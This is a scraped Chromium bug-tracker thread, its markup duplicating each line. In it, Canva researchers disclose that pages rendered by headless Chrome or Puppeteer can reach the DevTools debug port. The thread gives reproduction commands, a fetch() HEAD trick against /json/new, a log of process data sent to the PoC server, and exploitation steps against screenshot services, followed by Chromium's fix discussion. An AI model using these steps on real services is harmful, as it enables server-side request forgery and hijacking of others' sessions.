          <!---->
      <option value="0" selected="">
        Description #1 by zs...@canva.com (Nov 17, 2022)
      </option>
    <!---->
        </select>
      <div class="select-container">
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by zs...@canva.com (Nov 17, 2022)
      </option>
    <!---->
        </select>
      </div>
      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br>As you're well aware headless Chromium is widely used to convert websites to images and PDFs, this functionality can be found in numerous cloud services that render user-provided pages and return an image version. Projects like <span class="line"><!---->As you're well aware headless Chromium is widely used to convert websites to images and PDFs, this functionality can be found in numerous cloud services that render user-provided pages and return an image version. Projects like <!----></span>https://github.com/puppeteer/puppeteer<a class="undefined" target="_blank" href="https://github.com/puppeteer/puppeteer"><!---->https://github.com/puppeteer/puppeteer<!----></a> launch in a configuration by default that is vulnerable to the below issue.<span class="line"><!----> launch in a configuration by default that is vulnerable to the below issue.<!----></span><br><br>From our research we've found that Chrome is used in these cases via:<span class="line"><!---->From our research we've found that Chrome is used in these cases via:<!----></span><br><br> * Starting Chrome headlessly: --headless<span class="line"><!----> * Starting Chrome headlessly: --headless<!----></span><br> * Exposing the debug port so the launching process can control Chrome on loopback without launching Chrome per screenshot/PDF export, e.g. --remote-debugging-port=9222<span class="line"><!----> * Exposing the debug port so the launching process can control Chrome on loopback without launching Chrome per screenshot/PDF export, e.g. --remote-debugging-port=9222<!----></span><br><br>In order to Connect to the debug port a "target ID" is required. This target ID is printed by Chrome onto stdout, e.g.:<span class="line"><!---->In order to Connect to the debug port a "target ID" is required. This target ID is printed by Chrome onto stdout, e.g.:<!----></span><br><br>DevTools listening on ws://127.0.0.1:9222/devtools/browser/94ddc66f-fb4d-4456-93c4-b9c2281bbd39<span class="line"><!---->DevTools listening on ws://127.0.0.1:9222/devtools/browser/94ddc66f-fb4d-4456-93c4-b9c2281bbd39<!----></span><br><br>The target ID serves as a type of authentication token that prevents pages from connecting to the debug websocket.<span class="line"><!---->The target ID serves as a type of authentication token that prevents pages from connecting to the debug websocket.<!----></span><br><br>Due to several endpoints in the Chrome DevTools protocol it's possible for pages rendered within Chrome (as per the use-cases above, e.g. for converting HTML to images or PDFs) to obtain this target ID and connect to to the Chrome debugger. This allows:<span class="line"><!---->Due to several endpoints in the Chrome DevTools protocol it's possible for pages rendered within Chrome (as per the use-cases above, e.g. for converting HTML to images or PDFs) to obtain this target ID and connect to to the Chrome debugger. This allows:<!----></span><br><br> * CORS bypasses via methods like Runtime.evaluate<span class="line"><!----> * CORS bypasses via methods like Runtime.evaluate<!----></span><br> * Proxy bypasses (if setup) via Target.createBrowserContext<span class="line"><!----> * Proxy bypasses (if setup) via Target.createBrowserContext<!----></span><br> * Accessing other pages/tabs in the browser via Target.getTargets <span class="line"><!----> * Accessing other pages/tabs in the browser via Target.getTargets <!----></span><br><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br>Chrome Version: 107.0.5304.110 + stable<span class="line"><!---->Chrome Version: 107.0.5304.110 + stable<!----></span><br>Operating System: macOS 12.6.1 (M1) (also tested on Ubuntu 20.x x86)<span class="line"><!---->Operating System: macOS 12.6.1 (M1) (also tested on Ubuntu 20.x x86)<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br><br>Note that Chrome is launched with a fixed remote debugging port to make the PoC easier. We have a method for effectively finding the port (within 30s for the full 1-65535 range) which we can share if required.<span class="line"><!---->Note that Chrome is launched with a fixed remote debugging port to make the PoC easier. We have a method for effectively finding the port (within 30s for the full 1-65535 range) which we can share if required.<!----></span><br><br>To reproduce and simulate a cloud service using Chrome to convert an arbitrary webpage to an image:<span class="line"><!---->To reproduce and simulate a cloud service using Chrome to convert an arbitrary webpage to an image:<!----></span><br><br> 1. Save `index.html` and `persist.html` locally<span class="line"><!----> 1. Save `index.html` and `persist.html` locally<!----></span><br> 2. Serve them up on HTTP 5959, e.g. python3 -m http.server 5959<span class="line"><!----> 2. Serve them up on HTTP 5959, e.g. python3 -m http.server 5959<!----></span><br> 3. Launch Chrome headlessly and with a debugging port enabled (on loopback, this issue is unrelated to "remote" access)<span class="line"><!----> 3. Launch Chrome headlessly and with a debugging port enabled (on loopback, this issue is unrelated to "remote" access)<!----></span><br><br>/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \<span class="line"><!---->/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \<!----></span><br>    --remote-debugging-port=9222 \<span class="line"><!---->    --remote-debugging-port=9222 \<!----></span><br>    --user-data-dir=chrome-profile \<span class="line"><!---->    --user-data-dir=chrome-profile \<!----></span><br>    --no-first-run \<span class="line"><!---->    --no-first-run \<!----></span><br>    --headless \<span class="line"><!---->    --headless \<!----></span><br>    <span class="line"><!---->    <!----></span>http://localhost:5959/index.html<a class="undefined" target="_blank" href="http://localhost:5959/index.html"><!---->http://localhost:5959/index.html<!----></a><br><br>DevTools listening on ws://127.0.0.1:9222/devtools/browser/659f2867-0338-4cb0-8dea-96a1b26bc5cd<span class="line"><!---->DevTools listening on ws://127.0.0.1:9222/devtools/browser/659f2867-0338-4cb0-8dea-96a1b26bc5cd<!----></span><br><br> 4. Export the loaded page as a screenshot. This simulates the way Chrome is used server-side in many services:<span class="line"><!----> 4. Export the loaded page as a screenshot. This simulates the way Chrome is used server-side in many services:<!----></span><br><br>Using <span class="line"><!---->Using <!----></span>https://github.com/vi/websocat<a class="undefined" target="_blank" href="https://github.com/vi/websocat"><!---->https://github.com/vi/websocat<!----></a> for example:<span class="line"><!----> for example:<!----></span><br><br>$ echo '{"id":1, "method":"Target.getTargets"}' | websocat -n1 ws://127.0.0.1:9222/devtools/browser/659f2867-0338-4cb0-8dea-96a1b26bc5cd<span class="line"><!---->$ echo '{"id":1, "method":"Target.getTargets"}' | websocat -n1 ws://127.0.0.1:9222/devtools/browser/659f2867-0338-4cb0-8dea-96a1b26bc5cd<!----></span><br><br>{"id":1,"result":{"targetInfos":[{"targetId":"D868419574E9EC5AD570BA4C301FA972","type":"page","title":"localhost:5959/persist.html","url":"<span class="line"><!---->{"id":1,"result":{"targetInfos":[{"targetId":"D868419574E9EC5AD570BA4C301FA972","type":"page","title":"localhost:5959/persist.html","url":"<!----></span>http://localhost:5959/persist.html","attached":false,"canAccessOpener":false,"browserContextId":"3B1DA4A3D6955F3F0B73FC01A8D6C293"},{"targetId":"47519BDF096DC4C0273FDB56AC170D6E","type":"page","title":"localhost:5959/index.html","url":"http://localhost:5959/index.html","attached":false,"canAccessOpener":false,"browserContextId":"3B1DA4A3D6955F3F0B73FC01A8D6C293"}]}}<a class="undefined" target="_blank" href="http://localhost:5959/persist.html&quot;,&quot;attached&quot;:false,&quot;canAccessOpener&quot;:false,&quot;browserContextId&quot;:&quot;3B1DA4A3D6955F3F0B73FC01A8D6C293&quot;},{&quot;targetId&quot;:&quot;47519BDF096DC4C0273FDB56AC170D6E&quot;,&quot;type&quot;:&quot;page&quot;,&quot;title&quot;:&quot;localhost:5959/index.html&quot;,&quot;url&quot;:&quot;http://localhost:5959/index.html&quot;,&quot;attached&quot;:false,&quot;canAccessOpener&quot;:false,&quot;browserContextId&quot;:&quot;3B1DA4A3D6955F3F0B73FC01A8D6C293&quot;}]}}"><!---->http://localhost:5959/persist.html","attached":false,"canAccessOpener":false,"browserContextId":"3B1DA4A3D6955F3F0B73FC01A8D6C293"},{"targetId":"47519BDF096DC4C0273FDB56AC170D6E","type":"page","title":"localhost:5959/index.html","url":"http://localhost:5959/index.html","attached":false,"canAccessOpener":false,"browserContextId":"3B1DA4A3D6955F3F0B73FC01A8D6C293"}]}}<!----></a><br><br>Then screenshot the "index.html" target simulating an export from a page to an image:<span class="line"><!---->Then screenshot the "index.html" target simulating an export from a page to an image:<!----></span><br><br>$ echo '{"id":1, "method":"Page.captureScreenshot"}' | websocat -n1 -B 100000 ws://127.0.0.1:9222/devtools/page/47519BDF096DC4C0273FDB56AC170D6E | jq -r '.result.data' | base64 --decode > screenshot.png<span class="line"><!---->$ echo '{"id":1, "method":"Page.captureScreenshot"}' | websocat -n1 -B 100000 ws://127.0.0.1:9222/devtools/page/47519BDF096DC4C0273FDB56AC170D6E | jq -r '.result.data' | base64 --decode &gt; screenshot.png<!----></span><br><br>(See screenshot.png)<span class="line"><!---->(See screenshot.png)<!----></span><br><br>5. Update persist.html (line 14) with the browser ID from the screenshot (659f2867-0338-4cb0-8dea-96a1b26bc5cd)<span class="line"><!---->5. Update persist.html (line 14) with the browser ID from the screenshot (659f2867-0338-4cb0-8dea-96a1b26bc5cd)<!----></span><br>6. Note HTTP 5959 is called with the browser process info, demonstrating escaping from the page into the debugger<span class="line"><!---->6. Note HTTP 5959 is called with the browser process info, demonstrating escaping from the page into the debugger<!----></span><br><br>::1 - - [18/Nov/2022 15:06:10] "GET /persist.html HTTP/1.1" 200 -<span class="line"><!---->::1 - - [18/Nov/2022 15:06:10] "GET /persist.html HTTP/1.1" 200 -<!----></span><br>::1 - - [18/Nov/2022 15:06:10] "GET /?o=%7B%22id%22%3A1%2C%22result%22%3A%7B%22processInfo%22%3A%5B%7B%22type%22%3A%22browser%22%2C%22id%22%3A45761%2C%22cpuTime%22%3A0.936511%7D%2C%7B%22type%22%3A%22renderer%22%2C%22id%22%3A45771%2C%22cpuTime%22%3A1.150753%7D%2C%7B%22type%22%3A%22renderer%22%2C%22id%22%3A45767%2C%22cpuTime%22%3A0.070163%7D%2C%7B%22type%22%3A%22GPU%22%2C%22id%22%3A45764%2C%22cpuTime%22%3A0.519738%7D%2C%7B%22type%22%3A%22network.mojom.NetworkService%22%2C%22id%22%3A45766%2C%22cpuTime%22%3A0.277861%7D%5D%7D%7D HTTP/1.1" 200 -<span class="line"><!---->::1 - - [18/Nov/2022 15:06:10] "GET /?o=%7B%22id%22%3A1%2C%22result%22%3A%7B%22processInfo%22%3A%5B%7B%22type%22%3A%22browser%22%2C%22id%22%3A45761%2C%22cpuTime%22%3A0.936511%7D%2C%7B%22type%22%3A%22renderer%22%2C%22id%22%3A45771%2C%22cpuTime%22%3A1.150753%7D%2C%7B%22type%22%3A%22renderer%22%2C%22id%22%3A45767%2C%22cpuTime%22%3A0.070163%7D%2C%7B%22type%22%3A%22GPU%22%2C%22id%22%3A45764%2C%22cpuTime%22%3A0.519738%7D%2C%7B%22type%22%3A%22network.mojom.NetworkService%22%2C%22id%22%3A45766%2C%22cpuTime%22%3A0.277861%7D%5D%7D%7D HTTP/1.1" 200 -<!----></span><br><br><br>FIXING<span class="line"><!---->FIXING<!----></span><br><br>From looking into this there's a few ways impact can be reduced by Chrome:<span class="line"><!---->From looking into this there's a few ways impact can be reduced by Chrome:<!----></span><br><br> * Ensuring `/json/version` and related endpoints cannot be iframed (e.g. set a Content-Security-Policy or X-Frame-Options response header)<span class="line"><!----> * Ensuring `/json/version` and related endpoints cannot be iframed (e.g. set a Content-Security-Policy or X-Frame-Options response header)<!----></span><br> * Ensuring `/json/new` cannot be accessed from Chrome, or more specifically pages within the sandbox. The GET/POST deprecation should help here, but `/json/new` isn't required for this exploit if Chrome isn't relaunched.<span class="line"><!----> * Ensuring `/json/new` cannot be accessed from Chrome, or more specifically pages within the sandbox. The GET/POST deprecation should help here, but `/json/new` isn't required for this exploit if Chrome isn't relaunched.<!----></span><br> * More documentation, only the risks of "remote" access to the debug port is discussed in docs. However, the exploit above works over loopback.<span class="line"><!----> * More documentation, only the risks of "remote" access to the debug port is discussed in docs. However, the exploit above works over loopback.<!----></span><br><br><br>CREDIT INFORMATION<b class="line"><!---->CREDIT INFORMATION<!----></b><br><br>Reporter credit: Rhys Elsmore and Zac Sims of the Canva security team<span class="line"><!---->Reporter credit: Rhys Elsmore and Zac Sims of the Canva security team<!----></span><mr-comment-content></mr-comment-content>

          Comment 2<a class="comment-link" href="?id=1385982#c2">Comment 2<!----></a>

          
        by

        To add some more detail, there's two issues the vulnerability relates to:<span class="line"><!---->To add some more detail, there's two issues the vulnerability relates to:<!----></span><br><br> 1. /json/new gives a way to open a new tab without the restrictions on window.open. This gives persistence for long lived Chrome instances. Being able to see the "output" of a page isn't required to exploit this.<span class="line"><!----> 1. /json/new gives a way to open a new tab without the restrictions on window.open. This gives persistence for long lived Chrome instances. Being able to see the "output" of a page isn't required to exploit this.<!----></span><br><br> 2. The ability to get the browser target ID by framing /json/version. This gives a page the ability to bypass CORS, the proxy settings of Chrome, etc. A malicious user must be able to see the output of the page (e.g. PDF, screenshot, etc) to exploit this.<span class="line"><!----> 2. The ability to get the browser target ID by framing /json/version. This gives a page the ability to bypass CORS, the proxy settings of Chrome, etc. A malicious user must be able to see the output of the page (e.g. PDF, screenshot, etc) to exploit this.<!----></span><br><br>Given Puppeteer is maintained by the DevTools team, it's worth pointing out that it's vulnerable straight out of the box:<span class="line"><!---->Given Puppeteer is maintained by the DevTools team, it's worth pointing out that it's vulnerable straight out of the box:<!----></span><br><br>import puppeteer from 'puppeteer';<span class="line"><!---->import puppeteer from 'puppeteer';<!----></span><br><br>(async () => {<span class="line"><!---->(async () =&gt; {<!----></span><br>  const browser = await puppeteer.launch({<span class="line"><!---->  const browser = await puppeteer.launch({<!----></span><br>    headless: false<span class="line"><!---->    headless: false<!----></span><br>  });<span class="line"><!---->  });<!----></span><br>  console.log(browser.wsEndpoint())<span class="line"><!---->  console.log(browser.wsEndpoint())<!----></span><br>  const page = await browser.newPage();<span class="line"><!---->  const page = await browser.newPage();<!----></span><br><br>  await page.goto('<span class="line"><!---->  await page.goto('<!----></span>https://malicious-page.example.com/');<a class="undefined" target="_blank" href="https://malicious-page.example.com/');"><!---->https://malicious-page.example.com/');<!----></a><br>})();<span class="line"><!---->})();<!----></span><br><br>Starting this gives<span class="line"><!---->Starting this gives<!----></span><br><br>$ node index.js               <span class="line"><!---->$ node index.js               <!----></span><br>ws://127.0.0.1:62624/devtools/browser/34b57772-ed99-4899-9096-2b0c8672b61d<span class="line"><!---->ws://127.0.0.1:62624/devtools/browser/34b57772-ed99-4899-9096-2b0c8672b61d<!----></span><br><br>So the malicious page only needs to find port 62624 to open a new persistent tab, or frame <span class="line"><!---->So the malicious page only needs to find port 62624 to open a new persistent tab, or frame <!----></span>http://localhost:62624/json/version<a class="undefined" target="_blank" href="http://localhost:62624/json/version"><!---->http://localhost:62624/json/version<!----></a> to find the browser target ID if Puppeteer is being used to screenshot the malicious page. The Puppeteer docs state it's safe for automating malicious pages:<span class="line"><!----> to find the browser target ID if Puppeteer is being used to screenshot the malicious page. The Puppeteer docs state it's safe for automating malicious pages:<!----></span><br><br>> Security: Puppeteer operates off-process with respect to Chromium, making it safe to automate potentially malicious pages.<span class="line"><!---->&gt; Security: Puppeteer operates off-process with respect to Chromium, making it safe to automate potentially malicious pages.<!----></span><br>From <span class="line"><!---->From <!----></span>https://pptr.dev/faq<a class="undefined" target="_blank" href="https://pptr.dev/faq"><!---->https://pptr.dev/faq<!----></a><br><br>On a semi-related note there's seemingly some work to make /json only respect safe verbs, however the code at misses HEAD. So even if POST/GET were deprecated it's still possible for a malicious page to open tabs:<span class="line"><!---->On a semi-related note there's seemingly some work to make /json only respect safe verbs, however the code at misses HEAD. So even if POST/GET were deprecated it's still possible for a malicious page to open tabs:<!----></span><br><br>Using GET/POST gives:<span class="line"><!---->Using GET/POST gives:<!----></span><br>[1121/093650.263663:ERROR:devtools_http_handler.cc(636)] Using unsafe HTTP verb GET to invoke /json/new. This action will stop supporting GET and POST verbs in future versions.<span class="line"><!---->[1121/093650.263663:ERROR:devtools_http_handler.cc(636)] Using unsafe HTTP verb GET to invoke /json/new. This action will stop supporting GET and POST verbs in future versions.<!----></span><br><br>Which can be bypassed with:<span class="line"><!---->Which can be bypassed with:<!----></span><br>fetch('<span class="line"><!---->fetch('<!----></span>http://localhost:9222/json/new?http%3A%2F%2Flocalhost%3A5959%2fpersist.html<a class="undefined" target="_blank" href="http://localhost:9222/json/new?http%3A%2F%2Flocalhost%3A5959%2fpersist.html"><!---->http://localhost:9222/json/new?http%3A%2F%2Flocalhost%3A5959%2fpersist.html<!----></a>',<span class="line"><!---->',<!----></span> { method: 'HEAD', mode: 'no-cors' })<span class="line"><!----> { method: 'HEAD', mode: 'no-cors' })<!----></span><br><br>Given HEAD is one of the other no-cors safe verbs.<span class="line"><!---->Given HEAD is one of the other no-cors safe verbs.<!----></span><mr-comment-content></mr-comment-content>

        This all reproduces as claimed in M107. The /json/new problem vulnerability sounds reasonable to me. I'm kind of skeptical about the /json/version vulnerability, since I can't think of any server-side crawling context where a site would be able to see itself in a renderered screenshot. But the CSP changes sound straightforward, so they may still be worth doing, for defense in depth?<span class="line"><!---->This all reproduces as claimed in M107. The /json/new problem vulnerability sounds reasonable to me. I'm kind of skeptical about the /json/version vulnerability, since I can't think of any server-side crawling context where a site would be able to see itself in a renderered screenshot. But the CSP changes sound straightforward, so they may still be worth doing, for defense in depth?<!----></span><br><br>Adding security labels and triaging to some headless owners. skyostil@, caseq@ - can you take a look?<span class="line"><!---->Adding security labels and triaging to some headless owners. skyostil@, caseq@ - can you take a look?<!----></span><mr-comment-content></mr-comment-content>

        > I'm kind of skeptical about the /json/version vulnerability, since I can't think of any server-side crawling context where a site would be able to see itself in a renderered screenshot<span class="line"><!---->&gt; I'm kind of skeptical about the /json/version vulnerability, since I can't think of any server-side crawling context where a site would be able to see itself in a renderered screenshot<!----></span><br><br>The site doesn't need to see its own screenshot, but rather the malicious user needs a way to see the output. This a pretty common setup for HTML export in various SaaS tools, or in the the numerous "screenshot this URL" sites (several in <span class="line"><!---->The site doesn't need to see its own screenshot, but rather the malicious user needs a way to see the output. This a pretty common setup for HTML export in various SaaS tools, or in the the numerous "screenshot this URL" sites (several in <!----></span>https://github.com/transitive-bullshit/awesome-puppeteer#services<a class="undefined" target="_blank" href="https://github.com/transitive-bullshit/awesome-puppeteer#services"><!---->https://github.com/transitive-bullshit/awesome-puppeteer#services<!----></a> for example).<span class="line"><!----> for example).<!----></span><br><br>Exploitation looks like:<span class="line"><!---->Exploitation looks like:<!----></span><br><br> 1. Create a malicious page to export/screenshot, e.g. <span class="line"><!----> 1. Create a malicious page to export/screenshot, e.g. <!----></span>http://malicious.example.com<a class="undefined" target="_blank" href="http://malicious.example.com"><!---->http://malicious.example.com<!----></a><br> 2. Ask a SaaS service (e.g. CMS, Wiki, URL to Screenshot tool, Remote browser testing service) to screenshot the page<span class="line"><!----> 2. Ask a SaaS service (e.g. CMS, Wiki, URL to Screenshot tool, Remote browser testing service) to screenshot the page<!----></span><br> 3. The page pops persist.html via /json/new<span class="line"><!----> 3. The page pops persist.html via /json/new<!----></span><br> 4. The page returns /json/version in an iframe revealing the browser target ID (per the screenshot)<span class="line"><!----> 4. The page returns /json/version in an iframe revealing the browser target ID (per the screenshot)<!----></span><br> 5. The attacker essentially has a C2 in Chrome (persist.html) to connect to the websocket URL know they know the target ID from step 4.<span class="line"><!----> 5. The attacker essentially has a C2 in Chrome (persist.html) to connect to the websocket URL know they know the target ID from step 4.<!----></span><br><br>If Chromium is re-used between exports/screenshots it's possible to access other screenshots being run in the same Chromium instance. At the very least once you're in the debugger the malicious page can bypass CORS (useful for server side request forgery, or local file include) and drop things like the Chromium proxy settings.<span class="line"><!---->If Chromium is re-used between exports/screenshots it's possible to access other screenshots being run in the same Chromium instance. At the very least once you're in the debugger the malicious page can bypass CORS (useful for server side request forgery, or local file include) and drop things like the Chromium proxy settings.<!----></span><br><br>Some setups also launch Chromium once per export, but we've found it's possible to connect to other Chromium instances to run the exploit all the same. Noting this is with the default Puppeteer configuration - so the issue is very widespread.<span class="line"><!---->Some setups also launch Chromium once per export, but we've found it's possible to connect to other Chromium instances to run the exploit all the same. Noting this is with the default Puppeteer configuration - so the issue is very widespread.<!----></span><mr-comment-content></mr-comment-content>

        Thanks for the report. In general, we probably want to nudge folks toward `--remote-debugging-socket` instead of `--remote-debugging-port`, but meanwhile adding CSP on `/json` and making sure `HEAD` is also disallowed sounds good to me.<span class="line"><!---->Thanks for the report. In general, we probably want to nudge folks toward `--remote-debugging-socket` instead of `--remote-debugging-port`, but meanwhile adding CSP on `/json` and making sure `HEAD` is also disallowed sounds good to me.<!----></span><br><br>Caseq, did you want to take this over? I can take a look too, but you'd probably get a fix together quicker :)<span class="line"><!---->Caseq, did you want to take this over? I can take a look too, but you'd probably get a fix together quicker :)<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>

        <chops-timestamp title="Tue, Nov 29, 2022, 4:49 AM EST"></chops-timestamp>
        
      
        </div>
        
      </div>
    
      
        
        
      
        > The screenshot has to be requested from the Puppeteer, right (the page cannot do it)? and if the page redirects via `window.location = "<span class="line"><!---->&gt; The screenshot has to be requested from the Puppeteer, right (the page cannot do it)? and if the page redirects via `window.location = "<!----></span>http://localhost:9222/json/version"`<a class="undefined" target="_blank" href="http://localhost:9222/json/version&quot;`"><!---->http://localhost:9222/json/version"`<!----></a>,<span class="line"><!---->,<!----></span> it won't be able to execute any code to actually use the the target and page IDs to establish a CDP session.<span class="line"><!----> it won't be able to execute any code to actually use the the target and page IDs to establish a CDP session.<!----></span><br><br>Correct. The screenshot would have to be via Puppeteer (ignoring the "disable web security" usages of Chromium). This is a pretty common setup for "screenshot this URL" or "export this HTML" as PDF usages of Chromium. If the Chromium instance is long lived (which we've found is fairly common, presumably due to the overhead of re-launching) the browser target ID remains fixed. So in that case:<span class="line"><!---->Correct. The screenshot would have to be via Puppeteer (ignoring the "disable web security" usages of Chromium). This is a pretty common setup for "screenshot this URL" or "export this HTML" as PDF usages of Chromium. If the Chromium instance is long lived (which we've found is fairly common, presumably due to the overhead of re-launching) the browser target ID remains fixed. So in that case:<!----></span><br><br> 1. "Screenshot" or PDF export (depending on how Chromium is used) <span class="line"><!----> 1. "Screenshot" or PDF export (depending on how Chromium is used) <!----></span>http://localhost:9222/json/version<a class="undefined" target="_blank" href="http://localhost:9222/json/version"><!---->http://localhost:9222/json/version<!----></a><br> 2. "Screenshot" a malicious page using the browser target ID obtained in step 1<span class="line"><!----> 2. "Screenshot" a malicious page using the browser target ID obtained in step 1<!----></span><mr-comment-content></mr-comment-content>

        CSP will help where the page is framed, but there's still cases where it's possible to load `/json/* ` not in a frame. E.g.:<span class="line"><!---->CSP will help where the page is framed, but there's still cases where it's possible to load `/json/* ` not in a frame. E.g.:<!----></span><br><br> * Redirect the page to `<span class="line"><!----> * Redirect the page to `<!----></span>http://localhost<a class="undefined" target="_blank" href="http://localhost"><!---->http://localhost<!----></a>:<span class="line"><!---->:<!----></span><port>/json/version` to get the target ID; or<span class="line"><!---->&lt;port&gt;/json/version` to get the target ID; or<!----></span><br> * "Screenshot" <span class="line"><!----> * "Screenshot" <!----></span>http://localhost<a class="undefined" target="_blank" href="http://localhost"><!---->http://localhost<!----></a>:<span class="line"><!---->:<!----></span><port>/json/version directly - this is a vector for the numerous "screenshot a URL" style services<span class="line"><!---->&lt;port&gt;/json/version directly - this is a vector for the numerous "screenshot a URL" style services<!----></span><br><br>Are there mitigations that can be applied in this case? Moving to sockets with Puppeteer will help to some degree, as would black-holing localhost traffic from Chromium, e.g. --proxy-bypass-list="<-loopback>" + proxy settings<span class="line"><!---->Are there mitigations that can be applied in this case? Moving to sockets with Puppeteer will help to some degree, as would black-holing localhost traffic from Chromium, e.g. --proxy-bypass-list="&lt;-loopback&gt;" + proxy settings<!----></span><br><br>From researching this, I wanted to again highlight how many services are vulnerable to this - especially as many of them maintain long-running Chromium instances due to the startup time, meaning the target ID for the browser remains constant.<span class="line"><!---->From researching this, I wanted to again highlight how many services are vulnerable to this - especially as many of them maintain long-running Chromium instances due to the startup time, meaning the target ID for the browser remains constant.<!----></span><br><br>To ensure the larger community is protected and in line with the 90+30 day disclosure policy, we're planning to disclose the issue on March 18 2023.<span class="line"><!---->To ensure the larger community is protected and in line with the 90+30 day disclosure policy, we're planning to disclose the issue on March 18 2023.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

        Puppeteer users can also choose to use pipes (`--remote-debugging-pipe`) in which case there is no HTTP/websocket server.<span class="line"><!---->Puppeteer users can also choose to use pipes (`--remote-debugging-pipe`) in which case there is no HTTP/websocket server.<!----></span><mr-comment-content></mr-comment-content>

        Thanks! Yeah PUT should work given it'll need CORS. The host/IP validation is already implemented (can't talk on anything but localhost or 127.0.0.1 and variants of) which stops DNS rebinding attacks (e.g. CORS on attacker domain, then request to vulnerable localhost)<span class="line"><!---->Thanks! Yeah PUT should work given it'll need CORS. The host/IP validation is already implemented (can't talk on anything but localhost or 127.0.0.1 and variants of) which stops DNS rebinding attacks (e.g. CORS on attacker domain, then request to vulnerable localhost)<!----></span><mr-comment-content></mr-comment-content>

        by
        <mr-user-link></mr-user-link>

        So I tried to repro this issue using Puppeteer and succeeded. But it looks like enabling pipes by default would not be the right solution here because Puppeteer supports also Firefox and Firefox does not support pipes. Instead, Firefox checks for the Origin header of the socket requests (<span class="line"><!---->So I tried to repro this issue using Puppeteer and succeeded. But it looks like enabling pipes by default would not be the right solution here because Puppeteer supports also Firefox and Firefox does not support pipes. Instead, Firefox checks for the Origin header of the socket requests (<!----></span>https://searchfox.org/mozilla-central/source/remote/server/WebSocketHandshake.sys.mjs#135<a class="undefined" target="_blank" href="https://searchfox.org/mozilla-central/source/remote/server/WebSocketHandshake.sys.mjs#135"><!---->https://searchfox.org/mozilla-central/source/remote/server/WebSocketHandshake.sys.mjs#135<!----></a>)<span class="line"><!---->)<!----></span> and only allows requests that don't come from the browser or that conform to an allowlist provided via CLI. It appears that the following would be an appropriate solution:<span class="line"><!----> and only allows requests that don't come from the browser or that conform to an allowlist provided via CLI. It appears that the following would be an appropriate solution:<!----></span><br><br>1) Handle HTTP verbs properly: e.g., GET for reading data, PUT for modifying data. Keeping GET for /json/version would be generally backwards-compatible. <span class="line"><!---->1) Handle HTTP verbs properly: e.g., GET for reading data, PUT for modifying data. Keeping GET for /json/version would be generally backwards-compatible. <!----></span><br>2) Check the Origin header of the incoming web socket connections. Reject anything that has an Origin header.<span class="line"><!---->2) Check the Origin header of the incoming web socket connections. Reject anything that has an Origin header.<!----></span><br>3) Allow allow-listing origins via CLI.<span class="line"><!---->3) Allow allow-listing origins via CLI.<!----></span><br><br>This way even if someone guesses or learns about target IDs or websocket URLs in any way, they will not be able to exploit it. WDYT?<span class="line"><!---->This way even if someone guesses or learns about target IDs or websocket URLs in any way, they will not be able to exploit it. WDYT?<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

        We're still trying to verify if Firefox is vulnerable, but still haven't been able to get a PoC. As you say Firefox have the origin check + host check, where Chromium currently only has the host check.<span class="line"><!---->We're still trying to verify if Firefox is vulnerable, but still haven't been able to get a PoC. As you say Firefox have the origin check + host check, where Chromium currently only has the host check.<!----></span><br><br>I think that's a solid plan, and covers the exploitation paths we're aware of:<span class="line"><!---->I think that's a solid plan, and covers the exploitation paths we're aware of:<!----></span><br><br> * DNS rebinding is covered by the host check<span class="line"><!----> * DNS rebinding is covered by the host check<!----></span><br> * Origin check for anything coming from a browser, including rejecting null origins, requests from other Chromium instances, etc<span class="line"><!----> * Origin check for anything coming from a browser, including rejecting null origins, requests from other Chromium instances, etc<!----></span><br> * Most usages outside browsers (Puppeteer, custom drivers, etc) aren't likely going to be sending an Origin header anyway<span class="line"><!----> * Most usages outside browsers (Puppeteer, custom drivers, etc) aren't likely going to be sending an Origin header anyway<!----></span><mr-comment-content></mr-comment-content>

        I have tried implementing the Origin based restrictions (will still work on a CLI override). I confirmed that it works and one no longer can connect to the browser from the page. <span class="line"><!---->I have tried implementing the Origin based restrictions (will still work on a CLI override). I confirmed that it works and one no longer can connect to the browser from the page. <!----></span><br>What I found is that the Catapult telemetry is using a python websocket client that unnecessarily sends an Origin header. So adding those restrictions would break telemetry tests. I am gonna see if I can remove the Origin header from the telemetry client.<span class="line"><!---->What I found is that the Catapult telemetry is using a python websocket client that unnecessarily sends an Origin header. So adding those restrictions would break telemetry tests. I am gonna see if I can remove the Origin header from the telemetry client.<!----></span><mr-comment-content></mr-comment-content>

        The following revision refers to this bug:<span class="line"><!---->The following revision refers to this bug:<!----></span><br>  <span class="line"><!---->  <!----></span>https://chromium.googlesource.com/catapult/+/bf0782db65682f3918886ba69807c03fe515c2e8<a class="undefined" target="_blank" href="https://chromium.googlesource.com/catapult/+/bf0782db65682f3918886ba69807c03fe515c2e8"><!---->https://chromium.googlesource.com/catapult/+/bf0782db65682f3918886ba69807c03fe515c2e8<!----></a><br><br>commit <span class="line"><!---->commit <!----></span>bf0782db65682f3918886ba69807c03fe515c2e8<a class="undefined" target="_blank" href="https://crrev.com/bf0782db65682f3918886ba69807c03fe515c2e8"><!---->bf0782db65682f3918886ba69807c03fe515c2e8<!----></a><br>Author: Alex Rudenko <<span class="line"><!---->Author: Alex Rudenko &lt;<!----></span>alexrudenko@chromium.org<a class="undefined" target="_blank" href="/u/alexrudenko@chromium.org"><!---->alexrudenko@chromium.org<!----></a>><span class="line"><!---->&gt;<!----></span><br>Date: Wed Dec 14 21:40:18 2022<span class="line"><!---->Date: Wed Dec 14 21:40:18 2022<!----></span><br><br>Telemetry client should not set origin<span class="line"><!---->Telemetry client should not set origin<!----></span><br><br>The origin header is a forbidden header name[1] which means that generally it should not be up to the user to decide upon it. The origin header might be used by the server to enforce cross-origin policies and<span class="line"><!---->The origin header is a forbidden header name[1] which means that generally it should not be up to the user to decide upon it. The origin header might be used by the server to enforce cross-origin policies 